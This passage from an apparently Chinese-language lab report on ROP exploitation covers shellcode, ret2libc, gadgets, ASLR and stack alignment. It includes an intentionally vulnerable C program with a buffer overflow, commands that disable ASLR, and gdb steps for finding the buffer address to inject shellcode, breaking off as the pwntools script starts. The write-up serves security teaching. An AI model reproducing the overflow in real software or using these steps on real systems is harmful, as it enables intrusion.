                        <a href="#ubuntu16-%e4%b8%ad%e6%ad%a3%e5%b8%b8%e6%b2%a1%e6%9c%89%e5%ad%97%e8%8a%82%e5%af%b9%e9%bd%90" aria-label="Ubuntu16 中正常没有字节对齐">Ubuntu16 中正常没有字节对齐</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x05-%e5%ae%9e%e9%aa%8c%e7%bb%93%e8%ae%ba" aria-label="0x05 实验结论">0x05 实验结论</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>
  <div class="post-content"><h1 id="pwn_rop-调试">pwn_rop 调试<a hidden class="anchor" aria-hidden="true" href="#pwn_rop-调试">#</a></h1>
<h2 id="0x01-实验目的">0x01 实验目的<a hidden class="anchor" aria-hidden="true" href="#0x01-实验目的">#</a></h2>
<ul>
<li><strong>1.针对实验一，通过gdb调试rop1，确定shellcode的地址；此外，通过rop1.py的调试脚本确定shellcode地址；最终拿到shell权限。相关详细分析过程写入报告，并比较两种方法的特点。</strong></li>
<li><strong>2.针对实验二的32位环境和64位环境，通过调试分析，完成实际rop2.py和rop3.py （预留有空白和错误之处），最终拿到shell权限。相关详细分析过程写入报告</strong></li>
</ul>
<h2 id="0x02-实验环境">0x02 实验环境<a hidden class="anchor" aria-hidden="true" href="#0x02-实验环境">#</a></h2>
<ul>
<li>
<h4 id="ubuntu-20">Ubuntu 20<a hidden class="anchor" aria-hidden="true" href="#ubuntu-20">#</a></h4>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012222641174.png" alt="image-20211012222641174"  />
</li>
</ul>
</li>
<li>
<h4 id="gcc-版本">gcc 版本<a hidden class="anchor" aria-hidden="true" href="#gcc-版本">#</a></h4>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012222710806.png" alt="image-20211012222710806"  />
</li>
</ul>
</li>
<li>
<h4 id="工具">工具<a hidden class="anchor" aria-hidden="true" href="#工具">#</a></h4>
<ul>
<li>
<h5 id="pwndbg">pwndbg<a hidden class="anchor" aria-hidden="true" href="#pwndbg">#</a></h5>
</li>
<li>
<h5 id="ropgadget">ROPgadget<a hidden class="anchor" aria-hidden="true" href="#ropgadget">#</a></h5>
</li>
<li>
<h5 id="pwntools">pwntools<a hidden class="anchor" aria-hidden="true" href="#pwntools">#</a></h5>
</li>
<li>
<h5 id="visual-studio-code">visual studio code<a hidden class="anchor" aria-hidden="true" href="#visual-studio-code">#</a></h5>
<ul>
<li>通过vs code 的ssh 远程连接服务器ubuntu，并且远程调试程序。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x03-实验前提知识">0x03 实验前提知识<a hidden class="anchor" aria-hidden="true" href="#0x03-实验前提知识">#</a></h2>
<ul>
<li>
<p><strong>ROP</strong>的全称为 <strong>Return-oriented Programming</strong>（返回导向编程</p>
<ul>
<li><strong>绕过可执行空间保护、代码签名等安全保护机制，执行恶意代码</strong></li>
<li><strong>通过控制被调用的堆栈，对程序的控制流进行劫持，完成某些特定功能</strong></li>
</ul>
</li>
<li>
<h4 id="shellcode写在栈中">Shellcode写在栈中<a hidden class="anchor" aria-hidden="true" href="#shellcode写在栈中">#</a></h4>
<ul>
<li>
<p><strong>未提供堆栈的保护措施，直接将shellcode写入栈中，并将函数的返回地址覆写为shellcode的地址。</strong></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012223603636.png" alt="image-20211012223603636"  />
</li>
<li>返回地址覆盖为shellcode，从而实现执行shellcode。</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="ret2libc">Ret2libc<a hidden class="anchor" aria-hidden="true" href="#ret2libc">#</a></h4>
<ul>
<li>
<p><strong>加入了DEP（Data Execution Prevention）和NX（No execute）保护之后，拒绝执行堆栈上的任何代码。</strong></p>
</li>
<li>
<p>ret2libc是ROP技术的一种，通过将返回地址覆写为libc中的函数绕过NX保护。</p>
</li>
<li>
<p>我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行 libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)（或者execve(&quot;/bin/sh&quot;,NULL,NULL)），故而此时我们需要知道 system 函数的地址。</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012224854215.png" alt="image-20211012224854215"  />
</p>
</li>
</ul>
</li>
<li>
<h4 id="gadget"><code>gadget</code><a hidden class="anchor" aria-hidden="true" href="#gadget">#</a></h4>
<ul>
<li>64位处理器的发展，改变了函数的调用约定，要求函数的前6个参数保存在寄存器中，如果还有更多的参数才会保存在栈中。</li>
<li>想继续给函数传递参数,将不能通过简单操作栈来操作函数，还需要操作寄存器。由此ret2libc变的难以成功。</li>
<li>gadget是从可执行文件或共享库中获取的以ret为结尾的指令序列。这种ROP技术寻找能够将栈中的值pop到寄存器的指令片段，由此构造函数参数。</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211012233807583.png" alt="image-20211012233807583"  />
</li>
</ul>
</li>
<li>
<h4 id="aslr地址随机化">ASLR地址随机化<a hidden class="anchor" aria-hidden="true" href="#aslr地址随机化">#</a></h4>
<ul>
<li>
<p>开启地址随机化</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># 查看ASLR是否开启 
</span></span><span style="display:flex;"><span>cat /proc/sys/kernel/randomize_va_space  
</span></span><span style="display:flex;"><span># 关闭ASLR  
</span></span><span style="display:flex;"><span>sudo su  
</span></span><span style="display:flex;"><span>echo 0 &gt; /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013002935754.png" alt="image-20211013002935754"  />
</p>
</li>
</ul>
</li>
<li>
<h4 id="系统转储-dump-core">系统转储 dump core<a hidden class="anchor" aria-hidden="true" href="#系统转储-dump-core">#</a></h4>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># 查看是否开启：
</span></span><span style="display:flex;"><span>ulimit -c   （如果是0就是关着的）
</span></span><span style="display:flex;"><span># 开启转储 
</span></span><span style="display:flex;"><span>ulimit -c unlimited
</span></span><span style="display:flex;"><span># 设置转储文件位置为/tmp文件夹下面
</span></span><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>sudo sh -c &#39;echo &#34;/tmp/core.%t&#34; &gt; /proc/sys/kernel/core_pattern&#39;
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<h4 id="ubuntu-保持堆栈平衡">Ubuntu 保持堆栈平衡<a hidden class="anchor" aria-hidden="true" href="#ubuntu-保持堆栈平衡">#</a></h4>
<ul>
<li>
<p>在Ubuntu18以上的版本，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。</p>
<ul>
<li>
<p>因为命令:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>.text:000000000004F2F1 movhps  xmm0, [rsp+198h+var_190]
</span></span><span style="display:flex;"><span>.text:000000000004F2F6 movaps  [rsp+198h+var_158], xmm0 ; here
</span></span><span style="display:flex;"><span>.text:000000000004F2FB call    sigaction
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>主要原因是<code>0x4F2F6</code>处的<code>movaps [rsp+198h+var_158], xmm0</code>指令要求<code>rsp+198h+var_158</code>的值是对齐<code>16byte</code>（0x10），否则会直接触发中断从而crash。</p>
</li>
<li>
<p>这些都是在Ubuntu 18 版本以上的才存在。</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>栈的字节对齐，实际是指栈顶指针必须是16字节的整数倍。栈对齐使得在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。</p>
</li>
<li>
<p>但是实际上，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器，在执行某些实现多媒体操作的SSE指令时，如果数据没有对齐，将无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p>
</li>
<li>
<p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证， 它们分配内存将来可能会被SSE指令使用，所以必须是16字节对齐的，这也就形成了一种标准：</p>
<ul>
<li>任何内存分配函数（<code>alloca</code>, <code>malloc</code>, <code>calloc</code>或<code>realloc</code>）生成的块的起始地址都必须是16的倍数。</li>
<li>大多数函数的栈帧的边界都必须是16字节的倍数。</li>
</ul>
</li>
<li>
<p>如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（<code>rsp</code>）也必须是16的倍数。</p>
</li>
</ul>
</li>
<li>
<h4 id="实验源码">实验源码<a hidden class="anchor" aria-hidden="true" href="#实验源码">#</a></h4>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,buf,<span style="color:#ae81ff">256</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;hello rop</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<h4 id="分析程序漏洞">分析程序漏洞<a hidden class="anchor" aria-hidden="true" href="#分析程序漏洞">#</a></h4>
<ul>
<li>
<p>Vuln()函数中，buf数组的大小是128字节，但是在read时最多可以读入256字节，容易造成缓冲区溢出，利用这个漏洞对程序流进行劫持，执行构造好的payload。</p>
</li>
<li>
<p>具体的思路：把payload写入buf数组中，并利用缓冲区溢出漏洞，将返回地址修改为buf数组的地址，vuln()函数返回之后，就会到buf数组中执行shellcode</p>
</li>
</ul>
</li>
<li>
<p>可以利用pwntools有一个shellcraft模块可以实现shellcde，其中其中**shellcraft.sh()**就是生成执行/bin/sh的shellcode。</p>
<ul>
<li>
<p>可以用asm()将shellcode 转换为机器码</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013211608331.png" alt="image-20211013211608331"  />
</p>
</li>
</ul>
</li>
</ul>
<h2 id="0x04-实验过程">0x04 实验过程<a hidden class="anchor" aria-hidden="true" href="#0x04-实验过程">#</a></h2>
<h3 id="rop1_gdb">rop1_gdb<a hidden class="anchor" aria-hidden="true" href="#rop1_gdb">#</a></h3>
<ul>
<li>
<p>编译rop1.c，关闭栈保护和NX保护，在32位环境下，编译生成rop1</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013011338809.png" alt="image-20211013011338809"  />
</p>
</li>
<li>
<p>这里我们想实现的是通过gdb 调试rop1获得真正的buf地址，然后向里面输入我们精心构造好的shellcode,将返回地址覆盖为我们找到的真实buf地址。</p>
</li>
<li>
<p>这里解释一下为什么gdb调试中产生的buf地址和真正执行程序的地址原因</p>
<ul>
<li>
<p>正常程序运行时，会将环境变量字符串数组和命令行参数字符串数组存放在栈顶，而程序使用的局部变量等数据则位于这些字符串数组之后。环境变量字符串数组记录了诸如当前用户名、终端类型、搜索路径等环境信息。程序直接运行时，程序进程继承的是运行其的 shell 的环境变量，而程序通过 gdb 运行时，程序进程继承的是 gdb 的环境变量，这两者存在不同，从而会造成位于栈上的局部变量的地址发生改变。用户可在 gdb 中运行 show environment 命令获得环境变量参数。、</p>
</li>
<li>
<p>较之程序直接运行，位于栈顶的环境变量主要有以下变化</p>
<ul>
<li><strong>环境变量的内容发生改变</strong>，在程序直接运行时，_ 变量存放的是程序的执行路径，而通过 gdb 运行程序时，_ 变量存放的是 gdb 的执行路径。</li>
<li>通过 gdb 运行的调试程序继承了 gdb 的环境变量，其中<strong>包含新加入的环境变量 LINES 和 COLUMNS</strong>。</li>
<li>位于栈上的参数列表也可能不同，当用户通过 ./rop1 直接在shell 中运行程序时，位于参数数组的第一项 argv[0] 内容为”./rop1” ,而用户通过 gdb 运行 hello 程序时，程序的参数列表的第一项 argv[0] 的值为该程序的绝对路径”/home/reus09/test/pwn/2_rop/rop1”，这也会造成程序运行时局部变量地址的差异。<strong>建议终端环境下使用绝对路径运行程序</strong>，避免该差异。</li>
</ul>
</li>
<li>
<p>这里有三种解决方案</p>
<ul>
<li>
<p>通过gdb来attach 一个正在运行的程序，其地址和正在运行的地址是一致的</p>
</li>
<li>
<p>在gdb调试过程中，对传递给进程的环境变量进行操作和修改</p>
<ul>
<li>
<p>gdb 可通过 wrapper 函数运行调试程序。当设置好 wrapper 程序后，gdb 会以 exec wrapper hello 的 shell 命令的形式启动调试程序 Hello，wrapper程序首先运行并最终启动调试进程，之后由 gdb 对调试进程进行控制。通过 wrapper 程序，即可控制传递给调试进程的环境变量。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>set exec-wrapper wrapper　 //设置 wrapper 程序为 wrapper  
</span></span><span style="display:flex;"><span>show exec-wrapper    　　　//显示当前的 wrapper 程序
</span></span><span style="display:flex;"><span>unset exec-wrapper　　　　 //取消对 wrapper 程序的设置
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
<li>
<p>利用内核转储获取真实地址。</p>
<ul>
<li>使用命令<code>ulimit -c unlimited</code>启动内核转储，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</li>
<li>然后使用命令<code>gdb filename core</code>即可调试，获得真实地址。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="第一种方案">第一种方案<a hidden class="anchor" aria-hidden="true" href="#第一种方案">#</a></h4>
<ul>
<li>通过gdb来attach 一个正在运行的程序</li>
<li>运行rop1程序
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013213158072.png" alt="image-20211013213158072"  />
</li>
<li>利用<code>ps -ax </code>查看所有进程，发现rop1运行的进程pid 为 130896，将其直接attach
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013213305298.png" alt="image-20211013213305298"  />
</li>
</ul>
</li>
</ul>
</li>
<li>在vuln地方设置断点，并且执行程序，进入到vuln函数里面
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013213518280.png" alt="image-20211013213518280"  />
</li>
</ul>
</li>
<li>一路n 单步步过，跳到read函数上面
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013213616735.png" alt="image-20211013213616735"  />
</li>
<li>发现buf地址为<code>0xffffd1a0</code>，此时的buf地址即为真实地址</li>
</ul>
</li>
</ul>
<h4 id="第二种方案">第二种方案<a hidden class="anchor" aria-hidden="true" href="#第二种方案">#</a></h4>
<ul>
<li>
<p>gdb调试过程中，去除环境变量</p>
</li>
<li>
<p>输入命令<code>gdb rop1</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>set exec-wrapper env -u COLUMNS -u LINES -u _    //在 gdb 中设置 wrapper 程序
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>然后在vuln处设置断点，运行程序后，单步跳过一直到read部分</p>
</li>
<li>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013214752892.png" alt="image-20211013214752892"  />
</p>
</li>
<li>
<p>发现此时的buf首地址仍然为 <code>0xffffd1a0</code></p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013214935984.png" alt="image-20211013214935984"  />
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="shellcode-执行部分">shellcode 执行部分<a hidden class="anchor" aria-hidden="true" href="#shellcode-执行部分">#</a></h4>
<ul>
<li>
<p>上述两种方案确定了直接执行rop1程序的时候buf的真正首地址<code>0xffffd1a0</code></p>
</li>
<li>
<p>但是由于pwntools 自带的 python环境，会影响rop1程序运行的buf地址，因此这个真实地址是不能够在shellcode中直接作为返回地址执行的。</p>
</li>
<li>
<p>因为这里需要用gdb来实现shellcode 的调试，所以我们需要加入gdb的环境，并设置一些软断点来保证gdb中可以执行到shellcode</p>
</li>
<li>
<p>这里需要用到core报错的部分，同样我们也需要<strong>管道</strong>来输入我们精心构造好的shellcode</p>
</li>
<li>
<p>这里我们需要确定一下buf数组的长度，以及返回长度的位数，以便于确定找到返回地址从而覆盖掉它。</p>
</li>
<li>
<p>这里我们采用在IDA里面查看一下我们需要填充多少字符</p>
<ul>
<li>IDA查看buf数组的存储情况</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013220407284.png" alt="image-20211013220407284"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20211013220436470.png" alt="image-20211013220436470"  />
</li>
<li>由此确定buf首地址到esp 的长度为 <code>0x88</code>,然后到返回地址的长度为<code>0x04</code>,因此算上我们构造的shellcode，我们需要填充<code>0x8c</code>个字符</li>
</ul>
</li>
<li>
<p>然后我们这里以一个错误的地址<code>0xdeadbeef</code>来产生报错，从而得到在gdb中buf的可用地址</p>
</li>
<li>
<p>我们通过<code>pwntools</code>产生shellcode将其保存为<code>deadbeef</code>，其最后的地址会被覆盖为<code>0xdeadbeef</code></p>
<ul>
<li>
<p>脚本如下</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
